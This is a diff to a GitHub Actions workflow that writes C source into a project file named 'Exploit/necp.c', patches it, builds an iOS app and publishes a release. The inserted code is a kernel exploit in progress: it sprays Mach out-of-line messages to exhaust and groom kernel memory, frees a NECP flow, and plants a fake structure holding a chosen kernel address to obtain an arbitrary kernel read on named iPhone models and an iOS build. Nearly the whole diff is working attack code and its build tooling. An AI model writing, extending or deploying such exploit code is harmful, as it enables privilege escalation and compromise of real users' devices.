@@ -35,6 +35,63 @@ jobs:
           set -euo pipefail
           mkdir -p /tmp/nk
 
+          cat > /tmp/nk/spray.c <<'CEOF'
+          static int port_set_qlimit(mach_port_t p, mach_port_msgcount_t limit) {
+              mach_port_limits_t limits;
+              limits.mpl_qlimit = limit;
+              return mach_port_set_attributes(mach_task_self(), p,
+                                              MACH_PORT_LIMITS_INFO,
+                                              (mach_port_info_t)&limits,
+                                              MACH_PORT_LIMITS_INFO_COUNT);
+          }
+
+          static mach_port_t port_new(void) {
+              mach_port_t p = MACH_PORT_NULL;
+              kern_return_t kr = mach_port_allocate(mach_task_self(),
+                                                    MACH_PORT_RIGHT_RECEIVE, &p);
+              if (kr != KERN_SUCCESS) { log_err("PORT", "allocate kr=%d", kr); return MACH_PORT_NULL; }
+              kr = mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
+              if (kr != KERN_SUCCESS) { log_err("PORT", "insert_right kr=%d", kr); }
+              int qr = port_set_qlimit(p, 4096);
+              if (qr != KERN_SUCCESS) log_warn("PORT", "set_qlimit kr=%d", qr);
+              return p;
+          }
+
+          static int ool_spray_count(mach_port_t port, const void *data, size_t sz, int n) {
+              ool_send_t m;
+              int ok = 0;
+              for (int i = 0; i < n; i++) {
+                  memset(&m, 0, sizeof(m));
+                  m.hdr.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
+                                         | MACH_MSGH_BITS_COMPLEX;
+                  m.hdr.msgh_size        = sizeof(m);
+                  m.hdr.msgh_remote_port = port;
+                  m.hdr.msgh_id          = 0x4E41 + i;
+                  m.body.msgh_descriptor_count = 1;
+                  m.ool.address    = (void*)data;
+                  m.ool.size       = (mach_msg_size_t)sz;
+                  m.ool.copy       = MACH_MSG_VIRTUAL_COPY;
+                  m.ool.deallocate = FALSE;
+                  m.ool.type       = MACH_MSG_OOL_DESCRIPTOR;
+                  mach_msg_return_t kr = mach_msg(&m.hdr,
+                                                  MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                                  sizeof(m), 0, MACH_PORT_NULL,
+                                                  100, MACH_PORT_NULL);
+                  if (kr != MACH_MSG_SUCCESS) {
+                      log_warn("SPRAY", "stopped at i=%d kr=%d ok=%d", i, kr, ok);
+                      break;
+                  }
+                  ok++;
+                  if ((i + 1) % 256 == 0) log_info("SPRAY", "sent %d/%d", i + 1, n);
+              }
+              return ok;
+          }
+
+          static void ool_spray(mach_port_t port, const void *data, size_t sz, int n) {
+              (void)ool_spray_count(port, data, sz, n);
+          }
+          CEOF
+
           cat > /tmp/nk/kread.c <<'CEOF'
           static void dump_buf_words(const char *tag, const uint8_t *p, int n, int maxw) {
               char line[512];
@@ -54,18 +111,17 @@ jobs:
               *(uint64_t*)(fake + NCF_ASSIGNED_OFF)     = target_kaddr;
               *(uint64_t*)(fake + NCF_ASSIGNED_LEN_OFF) = read_len;
               *(uint64_t*)(fake + NCF_PARENT_OFF)       = 0;
-              log_info("RAW", "read 0x%llx len=%u fake[a=0x%llx l=0x%llx p=0x%llx]",
-                       (unsigned long long)target_kaddr, read_len,
-                       (unsigned long long)target_kaddr,
-                       (unsigned long long)read_len, (unsigned long long)0);
+              log_info("RAW", "read 0x%llx len=%u", (unsigned long long)target_kaddr, read_len);
 
               uint8_t junk[NCF_STRUCT_SZ]; memset(junk, 0x41, sizeof(junk));
               mach_port_t ex = port_new();
               if (ex == MACH_PORT_NULL) { log_err("RAW", "port_new fail"); return -1; }
-              ool_spray(ex, junk, NCF_STRUCT_SZ, EXHAUST_N);
+              int nex = ool_spray_count(ex, junk, NCF_STRUCT_SZ, EXHAUST_N);
+              log_info("RAW", "exhaust sprayed %d/%d", nex, EXHAUST_N);
 
               int fd = necp_open_fd();
               if (fd < 0) { log_err("RAW", "necp_open errno=%d", errno);
+                            ool_drain(ex, nex);
                             mach_port_destroy(mach_task_self(), ex); return -1; }
 
               uint8_t cuuid[16], fuuid[16];
@@ -73,18 +129,20 @@ jobs:
               int rc_af = (rc_ac == 0) ? necp_add_flow(fd, cuuid, fuuid) : -1;
               log_info("RAW", "ac=%d af=%d fd=%d", rc_ac, rc_af, fd);
               if (rc_ac != 0 || rc_af != 0) {
-                  close(fd); mach_port_destroy(mach_task_self(), ex); return -2;
+                  close(fd); ool_drain(ex, nex);
+                  mach_port_destroy(mach_task_self(), ex); return -2;
               }
 
               necp_remove_flow(fd, fuuid);
 
-              ool_drain(ex, EXHAUST_N);
+              ool_drain(ex, nex);
               mach_port_destroy(mach_task_self(), ex);
               usleep(200);
 
               mach_port_t sp = port_new();
               if (sp == MACH_PORT_NULL) { log_err("RAW", "spray port fail"); close(fd); return -1; }
-              ool_spray(sp, fake, NCF_STRUCT_SZ, SPRAY_N);
+              int nsp = ool_spray_count(sp, fake, NCF_STRUCT_SZ, SPRAY_N);
+              log_info("RAW", "fake sprayed %d/%d", nsp, SPRAY_N);
               usleep(150);
 
               memset(g_res_buf, 0, RESULT_BUF_SZ);
@@ -95,7 +153,7 @@ jobs:
                   dump_buf_words("RAW", g_res_buf, nw, 4);
               }
 
-              ool_drain(sp, SPRAY_N);
+              ool_drain(sp, nsp);
               mach_port_destroy(mach_task_self(), sp);
               close(fd);
               return ret;
@@ -153,7 +211,7 @@ jobs:
 
           static int nk_necp_run_impl(void) {
               nk_log("");
-              nk_log("=== natsuk1 v1.4 (natsuk1-kread-v4) ===");
+              nk_log("=== natsuk1 v1.5 (natsuk1-kread-v5) ===");
               nk_log("target: iOS 27.0 / XNU / arm64e");
               nk_log("device: iPhone14,5 / iPhone14,7");
               nk_log("");
@@ -208,17 +266,23 @@ jobs:
           with open(p) as f:
               s = f.read()
 
-          if "natsuk1-kread-v4" in s:
-              print("already patched to v4")
+          if "natsuk1-kread-v5" in s:
+              print("already patched to v5")
               sys.exit(0)
 
           orig = s
-          with open("/tmp/nk/kread.c") as f:
-              kread = f.read().rstrip()
-          with open("/tmp/nk/calib.c") as f:
-              calib = f.read().rstrip()
-          with open("/tmp/nk/run.c") as f:
-              run = f.read().rstrip()
+          def rd(name):
+              with open("/tmp/nk/" + name) as f:
+                  return f.read().rstrip()
+
+          spray = rd("spray.c")
+          kread = rd("kread.c")
+          calib = rd("calib.c")
+          run   = rd("run.c")
+
+          s = re.sub(
+              r"static mach_port_t port_new\(void\) \{.*?\n\}\n",
+              spray + "\n\n", s, count=1, flags=re.DOTALL)
 
           s = re.sub(
               r"static int kread_raw\(uint64_t kaddr, uint32_t len\) \{.*?\n\}\n",
@@ -234,7 +298,6 @@ jobs:
           single = re.compile(
               r"int nk_necp_run\(void\) \{.*?\n\}\n",
               flags=re.DOTALL)
-
           if combined.search(s):
               s = combined.sub(run + "\n", s, count=1)
           elif single.search(s):
@@ -243,23 +306,29 @@ jobs:
               print("ERROR: nk_necp_run block not found")
               sys.exit(1)
 
-          if "natsuk1-kread-v4" not in s:
+          if "natsuk1-kread-v5" not in s:
               print("ERROR: marker not inserted")
               sys.exit(1)
-
           if s == orig:
               print("ERROR: no changes applied")
               sys.exit(1)
 
-          g_busy_count = s.count("static volatile int g_busy = 0;")
-          impl_count   = s.count("static int nk_necp_run_impl(void)")
-          if g_busy_count != 1 or impl_count != 1:
-              print("ERROR: duplicate block: g_busy=%d impl=%d" % (g_busy_count, impl_count))
-              sys.exit(1)
+          for pat, name in [
+              ("static volatile int g_busy = 0;", "g_busy"),
+              ("static int nk_necp_run_impl(void)", "impl"),
+              ("int nk_necp_run(void)", "run"),
+              ("static int ool_spray_count(mach_port_t", "spray_count"),
+              ("static mach_port_t port_new(void)", "port_new"),
+              ("static int port_set_qlimit(mach_port_t", "qlimit"),
+          ]:
+              c = s.count(pat)
+              if c != 1:
+                  print("ERROR: %s count=%d" % (name, c))
+                  sys.exit(1)
 
           with open(p, "w") as f:
               f.write(s)
-          print("necp.c v4 patched")
+          print("necp.c v5 patched")
           PYEOF
 
           python3 /tmp/nk/patch.py
@@ -370,10 +439,12 @@ jobs:
         run: |
           set -euo pipefail
           F=natsuk1/Exploit/necp.c
-          grep -q "natsuk1-kread-v4" "$F"
+          grep -q "natsuk1-kread-v5" "$F"
+          grep -q "ool_spray_count" "$F"
+          grep -q "port_set_qlimit" "$F"
+          grep -q "MACH_SEND_TIMEOUT" "$F"
           grep -q "dump_buf_words" "$F"
           grep -q -e "----- attempt" "$F"
-          grep -q "g_busy" "$F"
           test "$(grep -c 'static volatile int g_busy = 0;' "$F")" = "1"
           test "$(grep -c 'static int nk_necp_run_impl(void)' "$F")" = "1"
           test "$(grep -c 'int nk_necp_run(void)' "$F")" = "1"
@@ -435,7 +506,7 @@ jobs:
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
             --prerelease --latest=false \
-            --notes "kread v4: verbose per-attempt diagnostics + buffer dumps"
+            --notes "kread v5: port qlimit bump + mach_msg send timeout"
 
       - name: Commit
         run: |
@@ -444,5 +515,5 @@ jobs:
           git config user.email "github-actions[bot]@users.noreply.github.com"
           git add natsuk1/Exploit/necp.c natsuk1/Offsets/
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "kread v4: verbose diagnostics [skip ci]"
+          git commit -m "kread v5: qlimit + send timeout [skip ci]"
           git push
